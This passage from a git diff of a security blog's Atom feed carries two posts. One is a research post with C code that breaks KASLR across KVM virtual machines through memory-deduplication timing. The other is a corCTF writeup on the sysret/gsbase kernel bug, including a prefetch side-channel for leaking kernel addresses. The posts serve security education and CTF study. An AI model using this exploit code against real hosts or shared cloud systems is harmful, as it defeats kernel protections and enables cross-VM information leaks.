<span class="mh">0x81208e0000100838</span><span class="p">,</span> <span class="mh">0x81208e0000100840</span><span class="p">,</span> <span class="mh">0x81208e0000100848</span><span class="p">,</span> <span class="mh">0x81208e0000100850</span><span class="p">,</span> <span class="mh">0x81208e0000100858</span><span class="p">,</span> <span class="mh">0x81208e0000100860</span><span class="p">,</span> <span class="mh">0x81208e0000100868</span><span class="p">,</span> <span class="mh">0x81208e0000100870</span><span class="p">,</span> <span class="mh">0x81208e0000100878</span><span class="p">,</span> <span class="mh">0x81208e0000100eb0</span><span class="p">,</span> <span class="mh">0x81208e0000100888</span><span class="p">,</span> <span class="mh">0x81208e0000100890</span><span class="p">,</span> <span class="mh">0x81208e0000100898</span><span class="p">,</span> <span class="mh">0x81208e0000101050</span><span class="p">,</span> <span class="mh">0x81208e0000101030</span><span class="p">,</span> <span class="mh">0x81208e0000101010</span><span class="p">,</span> <span class="mh">0x81208e0000101110</span><span class="p">,</span> <span class="mh">0x81208e0000100fb0</span><span class="p">,</span> <span class="mh">0x81208e00001008c8</span><span class="p">,</span> <span class="mh">0x81208e0000100ff0</span><span class="p">,</span> <span class="mh">0x81208e0000100ed0</span><span class="p">,</span> <span class="mh">0x81208e0000100f30</span><span class="p">,</span> <span class="mh">0x81208e0000100f90</span><span class="p">,</span> <span class="mh">0x81208e0000100fd0</span><span class="p">,</span> <span class="mh">0x81208e0000100f50</span><span class="p">,</span> <span class="mh">0x81208e0000100f70</span><span class="p">,</span> <span class="mh">0x81208e0000100ef0</span><span class="p">,</span> <span class="mh">0x81208e0000100e70</span><span class="p">,</span> <span class="mh">0x81208e0000100e90</span> <span class="p">};</span></code></pre></figure>
-
-<p>With that array created it is very easy to produce an IDT page for a potential KASLR offset:</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">setup_idt_page</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">();</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kt">uint64_t</span> <span class="n">shifted_offset</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">offset</span> <span class="o">&lt;&lt;</span> <span class="mi">53</span><span class="p">;</span>
-        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">shifted_offset</span> <span class="o">+</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-        <span class="n">page</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="n">page</span><span class="p">;</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>Now all that is left is to put it all together and we’ll have constructed an attack that can break KASLR within KVM by exploiting KSM on IDT pages!</p>
-
-<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// create candidate IDT pages</span>
-<span class="kt">void</span> <span class="o">*</span><span class="n">idt_pages</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-    <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">setup_idt_page</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
-
-<span class="c1">// detect if any candidate pages were merged</span>
-<span class="kt">int</span> <span class="n">attempt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"-- beginning attempt %d --</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">++</span><span class="n">attempt</span><span class="p">);</span>
-    <span class="kt">uint64_t</span> <span class="n">results</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">idt_pages</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-        <span class="n">time_access</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
-
-        <span class="kt">uint64_t</span> <span class="n">first</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
-        <span class="kt">uint64_t</span> <span class="n">second</span> <span class="o">=</span> <span class="n">time_poke</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
-
-        <span class="kt">void</span> <span class="o">*</span><span class="n">base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">);</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"%p (%#03x): %ld =&gt; %ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">);</span>
-        <span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">first</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">MERGE_THRESHOLD</span><span class="p">)</span> <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="s">"detected merged page at index %#03lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
-            <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff80000000</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="mi">21</span><span class="p">));</span>
-            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
-<span class="p">}</span></code></pre></figure>
-
-<p>Under the default configurations for KSM on my host machine, I got a successful KASLR break in just under nine minutes on a VM that had been up for several minutes.</p>
-
-<p>To see the attack working without having to wait so long, consider lowering KSM’s sleep_miliseconds config value to something more like 20ms.</p>
-
-<h3 id="breaking-kaslr-across-vms">breaking KASLR across VMs</h3>
-
-<p>Okay how about across VMs now? well, there isn’t actually anything more to do.</p>
-
-<p>The code to break KASLR on the current VM already works across VMs, it will detect any matching IDTs that exist on any running VMs so long as they are using KSM.</p>
-
-<p>Just to confirm this, I ran two VMs with the same kernel image and just removed the exit condition from the loop of the attack so it would keep running even if it found a deduplicated IDT page, and here are the results:</p>
-
-<p>VM 1:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@host:~/kvm-kaslr# cat /proc/kallsyms | grep "T _text"
-ffffffffb5800000 T _text
-</code></pre></div></div>
-
-<p>VM 2:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/root # cat /proc/kallsyms | grep "T _text"
-ffffffffb4400000 T _text
-</code></pre></div></div>
-
-<p>After running the attack for a while I got this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1ac
-kernel base = 0xffffffffb5800000
-</code></pre></div></div>
-
-<p>Followed shortly by:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>detected merged page at index 0x1a2
-kernel base = 0xffffffffb4400000
-</code></pre></div></div>
-
-<p>Cross VM leakage achieved!</p>
-
-<h2 id="closing-thoughts">closing thoughts</h2>
-
-<p>Deduplication attacks are pretty cool and fairly simple to pull off, but I am slightly concerned that KSM was enabled on my machine without me knowing… not that I was exposing any VMs to the internet anyways but since it was enabled on my machine I worry where else is it might be unknowningly enabled. All I exploited it for in this post was breaking KASLR, but theoretically it could be used to leak the contents of any page from any VM on the system, and research has been done to see just how far it can be pushed[6].</p>
-
-<p>Hope you learned something! This is my first attempt at blogging, it turned out a bit more code dense than I’d have liked, but hopefully the all the code examples made it easier to follow. I do kind of like the format of exploring an attack class and progressively developing an attack of that type, so maybe I’ll do it again sometime.</p>
-
-<h2 id="sources">sources</h2>
-
-<p>[1] Rodney Owens and Weichao Wang. Non-interactive OS fingerprinting through memory de-duplication technique in virtual machines. In International Performance Computing and Communications Conference, 2011.</p>
-
-<p>[2] Taehun Kim, Taehyun Kim, and Youngjoo Shin. Breaking kaslr using memory deduplication in virtualized environments. Electronics, 2021. URL: https://www.mdpi.com/2079-9292/10/17/2174.</p>
-
-<p>[3] Antonio Barresi, Kaveh Razavi, Mathias Payer, and Thomas R. Gross. CAIN: silently breaking ASLR in the cloud. In WOOT, 2015.</p>
-
-<p>[4] Martin Schwarzl, Erik Kraft, Moritz Lipp, and Daniel Gruss. Remote Page Deduplication Attacks. In NDSS, 2022.</p>
-
-<p>[5] K. Razavi, B. Gras, E. Bosman, B. Preneel, C. Giuffrida, and H. Bos. Flip Feng Shui: Hammering a Needle in the Software Stack. in SEC, 2016.</p>
-
-<p>[6] E. Bosman, K. Razavi, H. Bos, and C. Giuffrida. Dedup Est Machina: Memory Deduplication as an Advanced Exploitation Vector. In SP, 2016.</p>
-
-<p>[7] <a href="https://lwn.net/Articles/306704/">lwn: /dev/ksm: dynamic memory sharing</a></p>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="KVM" /><category term="KASLR" /><summary type="html"><![CDATA[I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.]]></summary></entry><entry><title type="html">corCTF: sysruption writeup</title><link href="https://zolutal.github.io/corctf-sysruption/" rel="alternate" type="text/html" title="corCTF: sysruption writeup" /><published>2023-06-17T00:00:00+00:00</published><updated>2023-06-17T00:00:00+00:00</updated><id>https://zolutal.github.io/corctf-sysruption</id><content type="html" xml:base="https://zolutal.github.io/corctf-sysruption/"><![CDATA[<style>
-.caption {
-  text-align: center;
-  font-size: .8rem !important;
-  color: lightgrey;
-}
-</style>
-
-<p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2023-07-31T07:03:56+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Justin Miller</name></author><entry><title type="html">corCTF: sysruption writeup</title><link href="https://zolutal.github.io/corctf-sysruption/" rel="alternate" type="text/html" title="corCTF: sysruption writeup" /><published>2023-07-30T00:00:00+00:00</published><updated>2023-07-30T00:00:00+00:00</updated><id>https://zolutal.github.io/corctf-sysruption</id><content type="html" xml:base="https://zolutal.github.io/corctf-sysruption/"><![CDATA[<p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>
 
 <p style="text-align: center;"><img src="/assets/corctf-sysruption/first-blood.png" alt="first-blood" /></p>
 
@@ -325,6 +9,30 @@ kernel base = 0xffffffffb4400000
 </blockquote>
 
 <p>So pretty much a combination of my favorite research topics :D</p>
+
+<p>Plus it had this sick motd!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
+▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
+░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
+  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
+▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
+▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
+░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
+      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
+          ░ ░
+</code></pre></div></div>
+
+<p>dist:
+<a href="/assets/corctf-sysruption/dist/patch.diff">patch</a>
+<a href="/assets/corctf-sysruption/dist/bzImage">bzImage</a>
+<a href="/assets/corctf-sysruption/dist/initramfs.cpio.gz">initramfs</a>
+<a href="/assets/corctf-sysruption/dist/kconfig">kconfig</a></p>
+
+<p>exploit:
+<a href="/assets/corctf-sysruption/exploit.c">exploit.c</a>
+<a href="/assets/corctf-sysruption/exploit">exploit</a></p>
 
 <h2 id="patchwork">patchwork</h2>
 
@@ -501,7 +209,7 @@ directly related to the task-switch mechanism. This information includes:
     <span class="nf">sysretq</span>
 </code></pre></div></div>
 
-<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero and results in a pagefault when.</p>
+<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.</p>
 
 <p>Lets take a deeper look at what is going on in the GP handler.</p>
 
@@ -515,7 +223,8 @@ directly related to the task-switch mechanism. This information includes:
     <span class="nf">call</span>   <span class="nv">exc_general_protection</span>
     <span class="nf">jmp</span>    <span class="nv">error_return</span>
 </code></pre></div></div>
-<p>When a GP occurs execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>
+
+<p>When a GP occurs, execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
     <span class="nf">push</span>   <span class="nb">rsi</span>
@@ -564,7 +273,7 @@ directly related to the task-switch mechanism. This information includes:
 
 <p>So how can we survive this?</p>
 
-<p>In the ptrace sysret blog, the author survives the double fault by targetintg the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>
+<p>In the ptrace sysret blog, the author survives the double fault by targeting the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>
 
 <p>Well the gsbase belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?</p>
 
@@ -577,9 +286,9 @@ directly related to the task-switch mechanism. This information includes:
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> and probably sigreturn as well…</p>
+<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> as well…</p>
 
-<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gs base be set from user space via the wrgsbase instruction!</p>
+<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!</p>
 
 <p><code class="language-plaintext highlighter-rouge">asm volatile("wrgsbase %0" : : "r" (gsbase));</code></p>
 
@@ -601,7 +310,9 @@ directly related to the task-switch mechanism. This information includes:
 
 <p>But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// largely based on: https://www.willsroot.io/2022/12/entrybleed.html</span>
+
+<span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
 #define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
 </span>
 <span class="cp">#define STEP_KERNEL 0x100000ull
@@ -620,6 +331,33 @@ directly related to the task-switch mechanism. This information includes:
 <span class="cp">#define DUMMY_ITERATIONS 5
 #define ITERATIONS 100
 </span>
+<span class="c1">// https://www.willsroot.io/2022/12/entrybleed.html</span>
+<span class="kt">uint64_t</span> <span class="nf">sidechannel</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">;</span>
+  <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">".intel_syntax noprefix;"</span>
+    <span class="s">"mfence;"</span>
+    <span class="s">"rdtscp;"</span>
+    <span class="s">"mov %0, rax;"</span>
+    <span class="s">"mov %1, rdx;"</span>
+    <span class="s">"xor rax, rax;"</span>
+    <span class="s">"lfence;"</span>
+    <span class="s">"prefetchnta qword ptr [%4];"</span>
+    <span class="s">"prefetcht2 qword ptr [%4];"</span>
+    <span class="s">"xor rax, rax;"</span>
+    <span class="s">"lfence;"</span>
+    <span class="s">"rdtscp;"</span>
+    <span class="s">"mov %2, rax;"</span>
+    <span class="s">"mov %3, rdx;"</span>
+    <span class="s">"mfence;"</span>
+    <span class="s">".att_syntax;"</span>
+    <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">d</span><span class="p">)</span>
+    <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="o">:</span> <span class="s">"rax"</span><span class="p">,</span> <span class="s">"rbx"</span><span class="p">,</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"rdx"</span><span class="p">);</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">a</span><span class="p">;</span>
+  <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="n">a</span><span class="p">;</span>
+<span class="p">}</span>
+
 <span class="kt">uint64_t</span> <span class="nf">prefetch</span><span class="p">(</span><span class="kt">int</span> <span class="n">phys</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">uint64_t</span> <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_KERNEL</span><span class="p">;</span>
@@ -664,8 +402,8 @@ directly related to the task-switch mechanism. This information includes:
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
 
-    <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
-    <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>
 
     <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>
@@ -1021,8 +759,324 @@ gsbase: 0xffff8d913bc00000
 corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
 </code></pre></div></div>
 
-<p>After a few runs the prefetch attacks succeeded and it worked remotely too! flag!</p>
+<p>After a few runs the prefetch attacks succeeded and the exploit worked! flag!</p>
 
 <h2 id="closing">closing</h2>
 
-<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug every since I learned about it.</p>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="CTF" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!</p>
+
+<style>
+.caption {
+  text-align: center;
+  font-size: .8rem !important;
+  color: lightgrey;
+}
+</style>]]></content><author><name>Justin Miller</name></author><category term="Exploitation" /><category term="Sidechannels" /><category term="Linux" /><category term="CTF Writeup" /><summary type="html"><![CDATA[I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!]]></summary></entry><entry><title type="html">Understanding Memory Deduplication Attacks</title><link href="https://zolutal.github.io/dedup-attacks/" rel="alternate" type="text/html" title="Understanding Memory Deduplication Attacks" /><published>2023-06-17T00:00:00+00:00</published><updated>2023-06-17T00:00:00+00:00</updated><id>https://zolutal.github.io/dedup-attacks</id><content type="html" xml:base="https://zolutal.github.io/dedup-attacks/"><![CDATA[<p>I recently came across a bunch of research describing attacks on memory deduplication, it has been used to fingerprint systems[1], crack (K)ASLR[2,3,4], leak database records[4], and even exploit rowhammer[5]. It’s a really cool class of attacks that I hadn’t heard of before, but I wasn’t having much luck finding any POCs for these attacks… So, I figured I’d write up what I learned about how these attacks work and write my own version of one of these attacks that can be used break KASLR in KVM for the current VM as well as across VMs.</p>
+
+<p><em>The ability to break KASLR across VMs while also bypassing KPTI using deduplication was discovered by the authors of [3], I will just be exploring the basis for these attacks and writing my own attack based on their research.</em></p>
+
+<p>A repository of the code examples associated with this post can be found here: <a href="https://github.com/zolutal/dedup-attacks">github.com/zolutal/dedup-attacks</a></p>
+
+<h2 id="wtf-is-deduplication">wtf is deduplication</h2>
+
+<p>Memory deduplication is an optimization to reduce the amount of memory being used on a system. The idea being that similar processes are likely to have similar memory contents, so by pointing pages of memory that have the same content to the same physical address and marking them copy-on-write a large amount of memory can be saved.</p>
+
+<p>Linux implements this via Kernel Same-Page Merging (KSM), which as the name implies “merges” pages with the same content by pointing them to the same physical memory. KSM will run periodically on a configurable interval, scanning a number of pages everytime for identical contents to merge.</p>
+
+<p>Note that KSM may not be enabled by default, though it was enabled on both of my Ubuntu 22.04 machines. Also, not every page is mergable, on Linux pages are only mergable if they are explicitly marked as mergable, e.g. using madvise with MADV_MERGABLE.</p>
+
+<p>Documentation regarding how to enable and configure KSM is located here: <a href="https://www.kernel.org/doc/html/v6.3/admin-guide/mm/ksm.html">Kernel Samepage Merging</a></p>
+
+<p>For reference, this was the default configuration for KSM on my Ubuntu machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sys/kernel/mm/ksm/run:1
+/sys/kernel/mm/ksm/stable_node_chains_prune_millisecs:2000
+/sys/kernel/mm/ksm/merge_across_nodes:1
+/sys/kernel/mm/ksm/use_zero_pages:0
+/sys/kernel/mm/ksm/pages_to_scan:100
+/sys/kernel/mm/ksm/sleep_millisecs:200
+/sys/kernel/mm/ksm/use_zero_pages:0
+</code></pre></div></div>
+
+<h2 id="observing-deduplication">observing deduplication</h2>
+
+<p>As mentioned, when a page is merged it is made copy-on-write (CoW), in short this just means that it’s access permissions are set to be not writeable (write-protected) so that a page fault will occur if it is written to. When the kernel sees that a page fault occurred from an attempt to write to a copy-on-write page, it will copy the contents of the page to a newly allocated page and perform the write operation on the new page.</p>
+
+<p>So if we have a page that got deduplicated and we write to it, a page fault will occur. The page fault will have to be handled by the kernel which will have to identify the page fault was a write to a copy-on-write page, allocate a new page, copy the contents of the old page to the new one, and perform the write again all before returning to userspace. That’s a whole lot of stuff to do which will take way longer than a non-faulting memory write, meaning we can easily use a timer to record whether or not a write was a faulting one allowing us to detect if deduplication occurred on a given page.</p>
+
+<h3 id="timing-page-faults">timing page faults</h3>
+
+<p>Then the first step in exploiting deduplication is being able to detect when a page fault ocurrs. A simple way to demonstrate page fault detection is by using memory allocated using mmap. On Linux, the default behavior of mmap is to not immediately allocate the memory that is requested. This is because Linux implements demand paging, so pages aren’t allocated memory until they are first accessed. We can see this from the example below.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// write a null byte to addr</span>
+<span class="kt">void</span> <span class="nf">poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="c1">// return the difference in the processor's timestamp before and after poke</span>
+<span class="kt">uint64_t</span> <span class="nf">time_poke</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">start</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span>
+    <span class="n">poke</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
